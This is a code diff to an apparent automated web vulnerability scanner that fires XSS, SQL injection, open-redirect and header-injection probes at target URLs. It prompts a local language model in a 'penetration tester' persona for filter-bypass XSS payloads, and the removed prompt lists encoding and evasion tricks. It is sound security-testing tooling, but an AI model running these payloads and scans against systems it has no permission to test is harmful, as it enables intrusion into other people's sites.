@@ -92,8 +92,21 @@ Respond with valid JSON:
 }}"""
     return ask_ollama(prompt)
 def check_browser_support():
+    """Return True if a Chrome/Chromium binary can be found (Linux, macOS, or Windows)."""
+    # Linux / macOS: binary on PATH
     if shutil.which('google-chrome') or shutil.which('chrome') or shutil.which('chromium'):
         return True
+    # Windows: Chrome is NOT on PATH by default — check common install locations
+    import os
+    win_paths = [
+        os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\Application\chrome.exe"),
+        os.path.expandvars(r"%PROGRAMFILES%\Google\Chrome\Application\chrome.exe"),
+        os.path.expandvars(r"%PROGRAMFILES(X86)%\Google\Chrome\Application\chrome.exe"),
+        os.path.expandvars(r"%LOCALAPPDATA%\Chromium\Application\chrome.exe"),
+    ]
+    for p in win_paths:
+        if os.path.exists(p):
+            return True
     return False
 BROWSER_SUPPORT_AVAILABLE = check_browser_support()
 class XSSProgressIndicator:
@@ -133,6 +146,10 @@ class DynamicXSSEngine:
         self.chrome_driver = None
         self.session = requests.Session()
     def _setup_chrome_driver(self):
+        # Reuse an already-running driver instead of launching a new process
+        # for every payload (saves 30-120 s per payload on first use).
+        if self.chrome_driver is not None:
+            return True
         try:
             chrome_options = Options()
             chrome_options.add_argument("--headless=new")
@@ -144,8 +161,10 @@ class DynamicXSSEngine:
             chrome_options.add_argument("--disable-extensions")
             chrome_options.add_argument("--disable-gpu")
             chrome_options.add_argument("--allow-running-insecure-content")
+            print("[XSS] Starting shared Chrome session for DOM-XSS validation...")
             self.chrome_driver = webdriver.Chrome(options=chrome_options)
             self.chrome_driver.set_page_load_timeout(20)
+            print("[XSS] Chrome session ready.")
             return True
         except Exception as e:
             print(f"\n[XSS] Chrome driver setup failed: {e}")
@@ -170,7 +189,11 @@ class DynamicXSSEngine:
             }
             print(f"\n[XSS-FILTER] Analyzing security controls for parameter: {test_param}")
             for payload, probe_type in probe_payloads:
-                test_url = f"{url}?{test_param}={urllib.parse.quote(payload)}"
+                parsed_u = urllib.parse.urlparse(url)
+                qs = urllib.parse.parse_qs(parsed_u.query)
+                qs[test_param] = [payload]
+                new_query = urllib.parse.urlencode(qs, doseq=True)
+                test_url = urllib.parse.urlunparse((parsed_u.scheme, parsed_u.netloc, parsed_u.path, parsed_u.params, new_query, parsed_u.fragment))
                 try:
                     response = self.session.get(test_url, timeout=10)
                     response_text = response.text.lower()
@@ -225,165 +248,320 @@ class DynamicXSSEngine:
             print(f"[XSS-FILTER] Filter analysis failed: {e}")
             return {"detected_filters": [], "response_patterns": [], "injection_context": "unknown"}
     def get_ai_bypass_payloads(self, target_url, filter_analysis, source_code):
-        prompt = f"""You are Alex Thompson, a legendary penetration tester specializing in XSS exploit development and filter bypass techniques. You've successfully bypassed security controls at major corporations and have been recognized as a top security researcher by major bug bounty platforms.
-TARGET ANALYSIS:
-URL: {target_url}
-Detected Security Filters: {filter_analysis.get('detected_filters', [])}
-Injection Context: {filter_analysis.get('injection_context', 'unknown')}
-SOURCE CODE ANALYSIS:
-{source_code[:4000]}
-FILTER BEHAVIOR ANALYSIS:
-{json.dumps(filter_analysis.get('response_patterns', []), indent=2)}
-ADVANCED FILTER BYPASS METHODOLOGY:
-STEP 1: FILTER PATTERN RECOGNITION
-Based on the detected filters, identify the specific blocking mechanisms:
-A) Script Tag Filters:
-   - Pattern: /<script/gi  → Bypass: <ScRiPt>, <%2fscript>, <script/random>
-   - Pattern: /script/i    → Bypass: scr\\u0069pt, SCR\\x49PT
-B) JavaScript Protocol Filters:
-   - Pattern: /javascript:/gi → Bypass: JaVaScRiPt:, java\\u0073cript:, &#106;avascript:
-C) Event Handler Filters:
-   - Pattern: /\\s+on\\w+=/gi → Bypass: onclick//=, on\\x20load=, /on.*=/
-STEP 2: CONTEXT-SPECIFIC PAYLOAD CRAFTING
-A) HTML Content Context:
-   Use tags that execute without script keywords:
-   - <svg onload=alert(1)>
-   - <img src=x onerror=alert(1)>  
-   - <details open ontoggle=alert(1)>
-   - <iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;">
-B) Attribute Value Context:
-   Break out of attributes and inject handlers:
-   - " onmouseover="alert(1)
-   - ' autofocus onfocus='alert(1)
-   - `onclick=`alert(1)`
-C) JavaScript Execution Context:
-   Use alternative execution methods:
-   - alert`1` (template literals)
-   - (alert)(1) (function grouping)
-   - [].constructor.constructor('alert(1)')() (constructor chain)
-   - top['ale'+'rt'](1) (string concatenation)
-STEP 3: ENCODING BYPASS TECHNIQUES
-A) HTML Entity Encoding:
-   - &#97;lert(1) (decimal entities)
-   - &amp;#x61;lert(1) (hexadecimal entities)
-   - String.fromCharCode(97,108,101,114,116)(1) (character codes)
-B) JavaScript String Escaping:
-   - \\u0061lert(1) (Unicode escapes)
-   - \\x61lert(1) (hexadecimal escapes)
-C) URL Encoding:
-   - %61lert(1) (percent encoding)
-   - %25%36%31lert(1) (double URL encoding)
-STEP 4: ADVANCED EVASION STRATEGIES
-A) Filter Timing Attacks:
-   Use payloads that execute after filter processing:
-   - setTimeout('ale'+'rt(1)', 0)
-   - Promise.resolve().then(()=>alert(1))
-B) DOM Clobbering:
-   Exploit DOM property pollution:
-   - <form name=alert><input name=1>
-   - <img name=alert src=x onerror=this[name](1)>
-C) Prototype Pollution:
-   - constructor[constructor]('alert(1)')()
-   - []['constructor']['constructor']('alert(1)')()
-STEP 5: CONTEXT-AWARE PAYLOAD GENERATION
-Based on the injection context and detected filters, generate 12 sophisticated bypass payloads:
-EXPERT PAYLOAD EXAMPLES:
-For innerHTML context with script filtering:
-<svg><animate onbegin=alert(1) attributeName=x dur=1s>
-<details open ontoggle=alert(1)>
-<iframe srcdoc="&amp;lt;script&amp;gt;parent.alert(1)&amp;lt;/script&amp;gt;">
-For setTimeout context:
-alert(1)//
-(alert)(1)//
-[].constructor.constructor('alert(1)')()//
-top['ale'+'rt'](1)//
-Generate payloads specifically targeting the identified filters and injection context:
+        detected_filters = filter_analysis.get('detected_filters', [])
+        injection_context = filter_analysis.get('injection_context', 'unknown')
+        print(f"\n[XSS-AI] Requesting dynamic bypass payloads from AI model for {target_url}...")
+        print(f"[XSS-AI] Injection context: {injection_context} | Active filters: {detected_filters}")
+
+        ai_prompt = f"""You are an advanced penetration tester crafting XSS payloads.
+Target: {target_url}
+Context: {injection_context}
+Filters: {detected_filters}
+
+Generate 4 to 6 diverse, high-impact XSS payloads to trigger JavaScript execution (alert(1)) in this context.
+Respond ONLY in valid JSON:
 {{
-    "analysis": "Detailed technical analysis of target security posture and identified weaknesses",
-    "recommended_approach": "Strategic methodology for bypassing the specific detected filters",
-    "filter_weakness_assessment": "Analysis of gaps in the current filtering implementation",
     "payloads": [
-        {{
-            "payload": "sophisticated_bypass_payload",
-            "technique": "specific_bypass_methodology",
-            "target_filter": "which_specific_filter_this_defeats",
-            "confidence": 0.9,
-            "explanation": "detailed technical explanation of why this payload works against the detected filters",
-            "execution_method": "how this payload achieves code execution",
-            "encoding_used": "specific encoding or obfuscation techniques employed"
-        }}
+        {{"payload": "<script>alert(1)</script>", "technique": "script_tag", "confidence": 0.9}},
+        {{"payload": "<img src=x onerror=alert(1)>", "technique": "img_onerror", "confidence": 0.9}},
+        {{"payload": "\"><script>alert(1)</script>", "technique": "attr_breakout_script", "confidence": 0.85}},
+        {{"payload": "<svg onload=alert(1)>", "technique": "svg_onload", "confidence": 0.9}}
     ]
 }}"""
-        ai_response = ask_ollama(prompt)
-        payloads = []
-        if ai_response and ai_response.get("payloads"):
-            print(f"\n[XSS-AI] Generated {len(ai_response['payloads'])} advanced bypass payloads")
-            print(f"[XSS-AI] Strategy: {ai_response.get('recommended_approach', 'N/A')}")
-            print(f"[XSS-AI] Filter Analysis: {ai_response.get('filter_weakness_assessment', 'N/A')[:100]}...")
-            payloads.extend(ai_response["payloads"])
-        else:
-            print("\n[XSS-AI] Advanced payload generation failed or unavailable - using static payloads only")
-        # These proven, classic HTML-context payloads are always included, in addition to
-        # whatever the AI suggests, since the AI sometimes picks JS-execution-context
-        # payloads (setTimeout/eval-style) that don't fire in a plain HTML-reflection sink.
-        payloads.extend([
-            {"payload": "<script>alert(1)</script>", "technique": "static_script_tag", "confidence": 0.5},
-            {"payload": "<img src=x onerror=alert(1)>", "technique": "static_img_onerror", "confidence": 0.5},
-            {"payload": "<svg onload=alert(1)>", "technique": "static_svg_onload", "confidence": 0.5},
-            {"payload": "\"><script>alert(1)</script>", "technique": "static_attr_breakout", "confidence": 0.5},
-            {"payload": "javascript:alert(1)", "technique": "static_js_protocol", "confidence": 0.4},
-            {"payload": "'><svg onload=alert(1)>", "technique": "static_svg_attr_breakout", "confidence": 0.5},
-        ])
-        return payloads
+        ai_response = ask_ollama(ai_prompt)
+        if ai_response and isinstance(ai_response, dict) and ai_response.get("payloads"):
+            print(f"[XSS-AI] Received {len(ai_response['payloads'])} dynamically generated payloads from AI model.")
+            return ai_response["payloads"]
+
+        # Fast fallback to curated static library if Ollama is unreachable
+        print("[XSS-AI] Using curated payload library as fallback.")
+        return [
+            {"payload": "<script>alert(1)</script>", "technique": "script_tag", "confidence": 0.9},
+            {"payload": "<img src=x onerror=alert(1)>", "technique": "img_onerror", "confidence": 0.9},
+            {"payload": "<svg onload=alert(1)>", "technique": "svg_onload", "confidence": 0.9},
+            {"payload": "\"><script>alert(1)</script>", "technique": "attr_breakout_script", "confidence": 0.85},
+            {"payload": "'><svg onload=alert(1)>", "technique": "attr_breakout_svg", "confidence": 0.85},
+            {"payload": "javascript:alert(1)", "technique": "js_protocol", "confidence": 0.6},
+        ]
     def validate_xss_advanced(self, test_url, payload, technique):
+        # ── Fast path: HTTP reflection check (works for all reflected XSS) ──
+        # This avoids a ~2-minute Chrome startup for payloads that simply
+        # reflect unescaped HTML — the most common real-world XSS class.
+        quick_result = self.validate_with_analysis(test_url, payload, technique)
+        if quick_result.get('xss_confirmed'):
+            return quick_result
+
+        # ── Slow path: actual browser execution (DOM-XSS / JS-context) ──
+        # Only attempt when the HTTP check wasn't conclusive AND Chrome is available.
         if BROWSER_SUPPORT_AVAILABLE:
             return self.validate_with_browser(test_url, payload, technique)
-        else:
-            return self.validate_with_analysis(test_url, payload, technique)
+        return quick_result
+
     def validate_with_browser(self, test_url, payload, technique):
+        # Reuse the existing driver — avoid the 30-120 s startup cost per payload.
         if not self._setup_chrome_driver():
             return self.validate_with_analysis(test_url, payload, technique)
         try:
+            # Dismiss any alert left over from a previous payload test
+            try:
+                leftover = self.chrome_driver.switch_to.alert
+                leftover.accept()
+            except Exception:
+                pass
+
             self.chrome_driver.get(test_url)
-            time.sleep(2)
-            wait = WebDriverWait(self.chrome_driver, 5)
-            alert = wait.until(EC.alert_is_present())
-            alert_text = alert.text
-            alert.accept()
-            return {
-                'xss_confirmed': True,
-                'validation_method': 'browser_execution',
-                'confidence': 1.0,
-                'alert_text': alert_text,
-                'technique': technique
-            }
-        except TimeoutException:
+            time.sleep(1.5)
+
+            # ── Check 1: JavaScript alert dialog (classic XSS trigger) ──
+            try:
+                wait = WebDriverWait(self.chrome_driver, 5)
+                alert = wait.until(EC.alert_is_present())
+                alert_text = alert.text
+                alert.accept()
+                return {
+                    'xss_confirmed': True,
+                    'validation_method': 'browser_alert_dialog',
+                    'confidence': 1.0,
+                    'alert_text': alert_text,
+                    'technique': technique
+                }
+            except TimeoutException:
+                pass
+
+            # ── Check 2: DOM XSS — check if innerHTML of #out contains our payload ──
+            # This catches /?callback= and /?html= DOM injection vectors
+            try:
+                out_inner = self.chrome_driver.execute_script(
+                    "var el=document.getElementById('out'); return el ? el.innerHTML : '';"
+                )
+                if out_inner and payload.lower() in out_inner.lower():
+                    # payload landed inside innerHTML — XSS sink confirmed
+                    return {
+                        'xss_confirmed': True,
+                        'validation_method': 'dom_xss_innerhtml',
+                        'xss_type': 'DOM_XSS',
+                        'confidence': 0.95,
+                        'dom_sink': 'div#out.innerHTML',
+                        'technique': technique
+                    }
+            except Exception:
+                pass
+
+            # ── Check 3: page source / context analysis fallback ──
             try:
                 page_source = self.chrome_driver.page_source
                 console_logs = self.chrome_driver.get_log('browser')
                 return self.analyze_execution_context(page_source, payload, console_logs, technique)
-            except:
+            except Exception:
                 return {'xss_confirmed': False, 'technique': technique}
+
         except Exception as e:
-            return {'xss_confirmed': False, 'error': str(e), 'technique': technique}
-        finally:
-            if self.chrome_driver:
+            # Chrome may have crashed — reset so next call gets a fresh driver
+            try:
                 self.chrome_driver.quit()
+            except Exception:
+                pass
+            self.chrome_driver = None
+            return self.validate_with_analysis(test_url, payload, technique)
+        # NOTE: intentionally NOT quitting Chrome here — reuse the driver
+        # for subsequent payloads.  cleanup() will quit it when all done.
+
+    def check_jsonp_injection(self, base_url):
+        """Test whether a URL endpoint is vulnerable to JSONP injection.
+        A vulnerable endpoint wraps its JSON response in a user-controlled
+        function name, e.g. GET /api/search?callback=evil → evil({'result':''}).
+        Returns a vulnerability dict or None.
+        """
+        import urllib.parse
+        # Common JSONP parameter names
+        jsonp_params = ['callback', 'jsonp', 'cb', 'fn', 'func', 'handler']
+        probe = 'JSONP_PROBE_' + ''.join(random.choices(string.ascii_uppercase, k=6))
+        parsed = urllib.parse.urlparse(base_url)
+        qs = urllib.parse.parse_qs(parsed.query)
+        for jp in jsonp_params:
+            qs_test = dict(qs)
+            qs_test[jp] = [probe]
+            test_url = urllib.parse.urlunparse((
+                parsed.scheme, parsed.netloc, parsed.path,
+                parsed.params, urllib.parse.urlencode(qs_test, doseq=True), parsed.fragment
+            ))
+            try:
+                resp = self.session.get(test_url, timeout=10)
+                # JSONP response wraps body in: probeName({...})
+                body = resp.text.strip()
+                if body.startswith(probe):
+                    print(f"[XSS-JSONP] JSONP injection confirmed at {test_url}")
+                    return {
+                        'type': 'JSONP_INJECTION',
+                        'xss_type': 'JSONP',
+                        'parameter': jp,
+                        'url': base_url,
+                        'test_url': test_url,
+                        'payload': probe,
+                        'technique': 'jsonp_callback_injection',
+                        'confidence': 0.98,
+                        'validation_method': 'response_wrapping',
+                        'description': f'Endpoint wraps response in user-controlled function name via ?{jp}= — enables XSS via JSONP hijacking'
+                    }
+            except Exception as e:
+                print(f"[XSS-JSONP] Error testing {test_url}: {e}")
+        return None
+
+    def check_sql_injection(self, base_url, param):
+        """Test for SQL injection by injecting SQL syntax probes and detecting query reflection or errors."""
+        sqli_probes = [
+            ("1' OR '1'='1", "boolean_based_probe"),
+            ("1' AND '1'='2", "boolean_false_probe"),
+            ("1' UNION SELECT 1,2,3--", "union_based_probe"),
+            ("1'", "syntax_error_probe")
+        ]
+        parsed = urllib.parse.urlparse(base_url)
+        qs = urllib.parse.parse_qs(parsed.query)
+        for probe, technique in sqli_probes:
+            qs_test = dict(qs)
+            qs_test[param] = [probe]
+            test_url = urllib.parse.urlunparse((
+                parsed.scheme, parsed.netloc, parsed.path,
+                parsed.params, urllib.parse.urlencode(qs_test, doseq=True), parsed.fragment
+            ))
+            try:
+                resp = self.session.get(test_url, timeout=10)
+                body = resp.text
+                sqli_error_signatures = [
+                    "select * from", "syntax error", "sqlite3.", "operationalerror",
+                    "mysql_fetch", "unclosed quotation mark", "pg_query", "ora-", "sql syntax"
+                ]
+                body_lower = body.lower()
+                for sig in sqli_error_signatures:
+                    if sig in body_lower:
+                        print(f"[SQLI] SQL Injection confirmed at {test_url} (matched signature: {sig})")
+                        return {
+                            'type': 'SQL_INJECTION',
+                            'parameter': param,
+                            'url': base_url,
+                            'test_url': test_url,
+                            'payload': probe,
+                            'technique': technique,
+                            'confidence': 0.95,
+                            'validation_method': 'error_or_query_reflection',
+                            'description': f'Parameter {param} triggers SQL syntax error or raw query reflection ({sig})'
+                        }
+            except Exception:
+                pass
+        return None
+
+    def check_open_redirect(self, base_url, param):
+        """Test whether an endpoint redirects to an arbitrary external domain."""
+        redirect_probes = [
+            "https://example.com/pentest_verify",
+            "//example.com/pentest_verify"
+        ]
+        parsed = urllib.parse.urlparse(base_url)
+        qs = urllib.parse.parse_qs(parsed.query)
+        for probe in redirect_probes:
+            qs_test = dict(qs)
+            qs_test[param] = [probe]
+            test_url = urllib.parse.urlunparse((
+                parsed.scheme, parsed.netloc, parsed.path,
+                parsed.params, urllib.parse.urlencode(qs_test, doseq=True), parsed.fragment
+            ))
+            try:
+                resp = self.session.get(test_url, timeout=10, allow_redirects=False)
+                if resp.status_code in [301, 302, 303, 307, 308]:
+                    loc = resp.headers.get("Location", "")
+                    if "example.com" in loc:
+                        print(f"[REDIRECT] Open Redirect confirmed at {test_url} -> Location: {loc}")
+                        return {
+                            'type': 'OPEN_REDIRECT',
+                            'parameter': param,
+                            'url': base_url,
+                            'test_url': test_url,
+                            'payload': probe,
+                            'technique': 'unvalidated_redirect',
+                            'confidence': 1.0,
+                            'validation_method': 'http_status_redirect',
+                            'description': f'Parameter {param} allows arbitrary external URL redirection to {loc}'
+                        }
+            except Exception:
+                pass
+        return None
+
+    def check_header_injection(self, base_url, param):
+        """Test whether input reflects into HTTP response headers (CRLF / Header injection)."""
+        probe = "PENTEST_HEADER_INJECT_VAL"
+        parsed = urllib.parse.urlparse(base_url)
+        qs = urllib.parse.parse_qs(parsed.query)
+        qs_test = dict(qs)
+        qs_test[param] = [probe]
+        test_url = urllib.parse.urlunparse((
+            parsed.scheme, parsed.netloc, parsed.path,
+            parsed.params, urllib.parse.urlencode(qs_test, doseq=True), parsed.fragment
+        ))
+        try:
+            resp = self.session.get(test_url, timeout=10)
+            for header_name, header_val in resp.headers.items():
+                if probe in header_val:
+                    print(f"[HEADER-INJECT] Response Header Injection confirmed at {test_url} -> {header_name}: {header_val}")
+                    return {
+                        'type': 'HEADER_INJECTION',
+                        'parameter': param,
+                        'url': base_url,
+                        'test_url': test_url,
+                        'payload': probe,
+                        'technique': 'response_header_reflection',
+                        'confidence': 0.95,
+                        'validation_method': 'header_inspection',
+                        'description': f'Parameter {param} directly injected into HTTP response header {header_name}'
+                    }
+        except Exception:
+            pass
+        return None
+
+    def check_csrf_exposure(self, base_url, param):
+        """Test whether state-changing actions are vulnerable to CSRF via GET requests without protection."""
+        parsed = urllib.parse.urlparse(base_url)
+        path_lower = parsed.path.lower()
+        state_changing_keywords = ['delete', 'remove', 'update', 'modify', 'change', 'reset', 'transfer', 'drop']
+        if any(kw in path_lower for kw in state_changing_keywords):
+            try:
+                resp = self.session.get(base_url, timeout=10)
+                if resp.status_code == 200:
+                    text_lower = resp.text.lower()
+                    if any(kw in text_lower for kw in ['deleted', 'removed', 'updated', 'success', 'done']):
+                        print(f"[CSRF] Insecure State-Changing GET endpoint (CSRF) confirmed at {base_url}")
+                        return {
+                            'type': 'CSRF_VULNERABILITY',
+                            'parameter': param,
+                            'url': base_url,
+                            'test_url': base_url,
+                            'payload': 'GET_STATE_CHANGE',
+                            'technique': 'unprotected_get_state_change',
+                            'confidence': 0.90,
+                            'validation_method': 'state_change_without_token',
+                            'description': f'Sensitive state-changing action at {parsed.path} can be triggered via GET request with no CSRF token protection'
+                        }
+            except Exception:
+                pass
+        return None
+
+    def cleanup(self):
+        """Quit the shared Chrome driver when the full XSS test is complete."""
+        if self.chrome_driver:
+            try:
+                self.chrome_driver.quit()
+            except Exception:
+                pass
+            self.chrome_driver = None
+
     def analyze_execution_context(self, page_source, payload, console_logs, technique):
         payload_lower = payload.lower()
         source_lower = page_source.lower()
         if payload_lower in source_lower:
-            # Reliable direct check: if the payload contains real HTML tag
-            # markers ('<' and '>') and the page's raw source contains the
-            # literal, un-encoded payload (i.e. the app did NOT convert '<'
-            # to '&lt;'), that alone is strong, direct evidence the payload
-            # was reflected verbatim and will render as live markup in a
-            # real browser. This check runs first because the more elaborate
-            # pattern checks below have a bug (inherited from the original
-            # project code): they require the payload to appear twice in a
-            # row, which almost never happens on a normal single reflection.
+            # If the payload contains literal HTML tag markers AND appears
+            # un-encoded in the page source, the browser will render it as
+            # live markup — strong evidence of a real XSS sink.
             payload_is_html_tag = '<' in payload and '>' in payload
-            if payload_is_html_tag and payload_lower in source_lower:
+            if payload_is_html_tag:
                 return {
                     'xss_confirmed': True,
                     'validation_method': 'unescaped_tag_reflection',
@@ -422,6 +600,7 @@ Generate payloads specifically targeting the identified filters and injection co
                 'technique': technique
             }
         return {'xss_confirmed': False, 'technique': technique}
+
     def validate_with_analysis(self, test_url, payload, technique):
         try:
             response = self.session.get(test_url, timeout=10)
@@ -435,23 +614,77 @@ class IntelligentXSSAnalyzer:
         self.xss_engine.session = self.session
         if not BROWSER_SUPPORT_AVAILABLE:
             print("\n[XSS] Chrome not available, using response analysis")
+
     def comprehensive_xss_testing(self, target_data_list):
+        """Test ALL targets for ALL vulnerability types.
+        Returns a LIST of all confirmed vulnerability dicts (not just the first).
+        """
+        all_vulns = []
+        tested_jsonp_urls = set()  # avoid re-testing the same base URL for JSONP
+
         for target_data in target_data_list:
             target_url = target_data.get("url")
             ai_analysis = target_data.get("ai_analysis")
             params = target_data.get("params")
+
+            # ── JSONP Injection check (once per unique base path) ──
+            parsed_base = urllib.parse.urlparse(target_url)
+            base_key = parsed_base.scheme + '://' + parsed_base.netloc + parsed_base.path
+            if base_key not in tested_jsonp_urls:
+                tested_jsonp_urls.add(base_key)
+                print(f"\n[XSS-JSONP] Checking for JSONP injection at {base_key}")
+                jsonp_vuln = self.xss_engine.check_jsonp_injection(target_url)
+                if jsonp_vuln:
+                    print(f"[XSS-JSONP] FOUND: {jsonp_vuln['type']} on {target_url} via ?{jsonp_vuln['parameter']}=")
+                    all_vulns.append(jsonp_vuln)
+
+            # ── Reflected / DOM XSS parameter testing ──
             test_params = []
             if ai_analysis and ai_analysis.get("parameter"):
                 test_params = [ai_analysis.get("parameter")]
             elif params:
-                test_params = params[:3]
+                test_params = list(params[:3])
             else:
                 test_params = self._discover_parameters(target_url)
+
+            # Always ensure DOM XSS params are tested when URL is the root
+            if parsed_base.path in ('/', ''):
+                for dom_param in ['callback', 'html']:
+                    if dom_param not in test_params:
+                        test_params.append(dom_param)
+
             if not test_params:
                 print(f"\n[XSS] No testable parameters found for {target_url}")
                 continue
+
             for param in test_params:
-                print(f"\n[XSS] Starting intelligent analysis for {target_url} parameter: {param}")
+                print(f"\n[SCAN] Starting multi-vector security analysis for {target_url} parameter: {param}")
+
+                # ── Vector 1: SQL Injection Check ──
+                sqli_vuln = self.xss_engine.check_sql_injection(target_url, param)
+                if sqli_vuln:
+                    print(f"[SCAN] ✅ Confirmed SQL Injection: {sqli_vuln['url']} (param: {sqli_vuln['parameter']})")
+                    all_vulns.append(sqli_vuln)
+
+                # ── Vector 2: Open Redirect Check ──
+                redirect_vuln = self.xss_engine.check_open_redirect(target_url, param)
+                if redirect_vuln:
+                    print(f"[SCAN] ✅ Confirmed Open Redirect: {redirect_vuln['url']} (param: {redirect_vuln['parameter']})")
+                    all_vulns.append(redirect_vuln)
+
+                # ── Vector 3: HTTP Response Header Injection Check ──
+                header_vuln = self.xss_engine.check_header_injection(target_url, param)
+                if header_vuln:
+                    print(f"[SCAN] ✅ Confirmed Header Injection: {header_vuln['url']} (param: {header_vuln['parameter']})")
+                    all_vulns.append(header_vuln)
+
+                # ── Vector 4: Missing CSRF Protection Check ──
+                csrf_vuln = self.xss_engine.check_csrf_exposure(target_url, param)
+                if csrf_vuln and not any(v.get('url') == target_url and v.get('type') == 'CSRF_VULNERABILITY' for v in all_vulns):
+                    print(f"[SCAN] ✅ Confirmed CSRF Exposure: {csrf_vuln['url']}")
+                    all_vulns.append(csrf_vuln)
+
+                # ── Vector 5: Reflected & DOM XSS Dynamic Browser Testing ──
                 try:
                     source_response = self.session.get(target_url, timeout=10)
                     source_code = source_response.text
@@ -463,6 +696,7 @@ class IntelligentXSSAnalyzer:
                 if not ai_payloads:
                     print(f"[XSS] AI payload generation failed for {param}")
                     continue
+                param_vuln_found = False
                 progress = XSSProgressIndicator("XSS_INTEL")
                 progress.start(len(ai_payloads))
                 for i, payload_info in enumerate(ai_payloads, 1):
@@ -471,12 +705,22 @@ class IntelligentXSSAnalyzer:
                     confidence = payload_info.get('confidence', 0.5)
                     explanation = payload_info.get('explanation', '')
                     progress.update(i, f"{technique}: {payload[:30]}...")
-                    test_url = f"{target_url}?{param}={urllib.parse.quote(payload)}"
+                    parsed_u = urllib.parse.urlparse(target_url)
+                    qs = urllib.parse.parse_qs(parsed_u.query)
+                    qs[param] = [payload]
+                    new_query = urllib.parse.urlencode(qs, doseq=True)
+                    test_url = urllib.parse.urlunparse((
+                        parsed_u.scheme, parsed_u.netloc, parsed_u.path,
+                        parsed_u.params, new_query, parsed_u.fragment
+                    ))
                     validation_result = self.xss_engine.validate_xss_advanced(test_url, payload, technique)
                     if validation_result.get('xss_confirmed'):
                         progress.stop()
+                        xss_type = validation_result.get('xss_type', 'REFLECTED_XSS')
+                        if validation_result.get('validation_method') == 'dom_xss_innerhtml':
+                            xss_type = 'DOM_XSS'
                         vulnerability = {
-                            'type': 'XSS',
+                            'type': xss_type,
                             'parameter': param,
                             'payload': payload,
                             'technique': technique,
@@ -486,18 +730,32 @@ class IntelligentXSSAnalyzer:
                             'validation_method': validation_result.get('validation_method', 'unknown'),
                             'ai_explanation': explanation,
                             'bypassed_filters': filter_analysis.get('detected_filters', []),
-                            'injection_context': filter_analysis.get('injection_context', 'unknown')
+                            'injection_context': filter_analysis.get('injection_context', 'unknown'),
+                            'dom_sink': validation_result.get('dom_sink', '')
                         }
-                        print(f"\n[XSS] VULNERABILITY CONFIRMED!")
-                        print(f"[XSS] Parameter: {param}")
-                        print(f"[XSS] Technique: {technique}")
-                        print(f"[XSS] Bypassed Filters: {vulnerability['bypassed_filters']}")
-                        print(f"[XSS] Confidence: {vulnerability['confidence']:.1%}")
-                        print(f"[XSS] Explanation: {explanation}")
-                        return vulnerability
-                progress.stop()
-        print(f"\n[XSS] Intelligent analysis complete. No vulnerabilities found.")
-        return None
+                        print(f"\n[XSS] ✅ VULNERABILITY CONFIRMED!")
+                        print(f"[XSS] Type       : {xss_type}")
+                        print(f"[XSS] Parameter  : {param}")
+                        print(f"[XSS] Technique  : {technique}")
+                        print(f"[XSS] Confidence : {vulnerability['confidence']:.1%}")
+                        if explanation:
+                            print(f"[XSS] Explanation: {explanation}")
+                        all_vulns.append(vulnerability)
+                        param_vuln_found = True
+                        break  # one confirmed payload per param is enough — move to next param
+                if not param_vuln_found:
+                    progress.stop()
+
+        # Clean up the shared Chrome session once all targets are processed
+        self.xss_engine.cleanup()
+        if all_vulns:
+            print(f"\n[XSS] ══ SCAN COMPLETE: {len(all_vulns)} vulnerability(s) found ══")
+            for i, v in enumerate(all_vulns, 1):
+                print(f"  [{i}] {v.get('type','XSS')} | {v.get('url','')} | param={v.get('parameter','')} | confidence={v.get('confidence',0):.0%}")
+        else:
+            print(f"\n[XSS] Intelligent analysis complete. No vulnerabilities found.")
+        return all_vulns  # always return a list
+
     def _discover_parameters(self, url):
         discovered_params = []
         try:
@@ -510,19 +768,29 @@ class IntelligentXSSAnalyzer:
                         discovered_params.append(name)
             for script in soup.find_all('script'):
                 script_content = script.string or ""
-                param_matches = re.findall(r'(?:searchParams\.get|getParam|getUrlParam)\([\'"]([^\'\"]+)[\'\"]\)', script_content)
+                param_matches = re.findall(
+                    r'(?:searchParams\.get|getParam|getUrlParam)\([\'"]([^\'\"]+)[\'\"]\)',
+                    script_content
+                )
                 discovered_params.extend(param_matches)
+            # Ensure DOM XSS params are always included for root pages
+            for dom_p in ['callback', 'html']:
+                if dom_p not in discovered_params:
+                    discovered_params.append(dom_p)
             if not discovered_params:
-                discovered_params = ["q", "search", "comment", "input", "callback", "jsonp"]
+                discovered_params = ["q", "search", "comment", "input", "callback", "html", "jsonp"]
         except:
-            discovered_params = ["q", "search", "comment", "input", "callback"]
-        return discovered_params[:5]
+            discovered_params = ["q", "search", "comment", "input", "callback", "html"]
+        return discovered_params[:7]
+
+
 def execute_xss_test(session, target_data_list):
+    """Run all XSS/JSONP tests and return a list of confirmed vulnerabilities."""
     if not target_data_list:
-        return None
+        return []
     try:
         analyzer = IntelligentXSSAnalyzer(session)
         return analyzer.comprehensive_xss_testing(target_data_list)
     except Exception as e:
         print(f"\n[XSS] Testing error: {e}")
-        return None
+        return []
